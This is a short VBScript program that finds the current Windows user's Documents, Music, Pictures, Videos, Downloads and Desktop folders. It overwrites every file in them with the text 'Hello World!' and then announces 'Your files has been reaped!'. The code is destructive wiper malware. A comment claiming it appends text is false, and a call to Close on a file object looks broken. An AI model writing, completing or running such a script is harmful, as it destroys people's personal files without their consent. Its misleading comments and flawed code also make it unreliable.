Option Explicit

Dim objFSO, objFolder, objFile
Dim arrFolders, folderPath
Dim objNetwork, strUsername

' Create a WScript.Network object
Set objNetwork = CreateObject("WScript.Network")

' Retrieve the username of the currently logged-in user
strUsername = objNetwork.UserName

' Define the folders to target
arrFolders = Array("C:\Users\" & strUsername & "\Documents", "C:\Users\" & strUsername & "\Music", "C:\Users\" & strUsername & "\Pictures", "C:\Users\" & strUsername & "\Videos", "C:\Users\" & strUsername & "\Downloads", "C:\Users\" & strUsername & "\Desktop")

' Create a FileSystemObject
Set objFSO = CreateObject("Scripting.FileSystemObject")


' Loop through each folder in the array
For Each folderPath In arrFolders
    ' Check if folder exists
    If objFSO.FolderExists(folderPath) Then
        ' Get the folder object
        Set objFolder = objFSO.GetFolder(folderPath)
        
        ' Loop through each file in the folder
        For Each objFile In objFolder.Files
            ' Read the content of the file
            Dim strContent
            strContent = objFile.OpenAsTextStream(1).ReadAll
            ' Append "Hello World!" to the content
            strContent = "Hello World!"
            ' Write the modified content back to the file
            objFile.OpenAsTextStream(2).Write strContent
            ' Close the file
            objFile.Close
        Next
        
        ' Clean up folder object
        Set objFolder = Nothing
    End If
Next

' Clean up FileSystemObject
Set objFSO = Nothing

' Clean up the WScript.Network object
Set objNetwork = Nothing

WScript.Echo "Your files has been reaped!"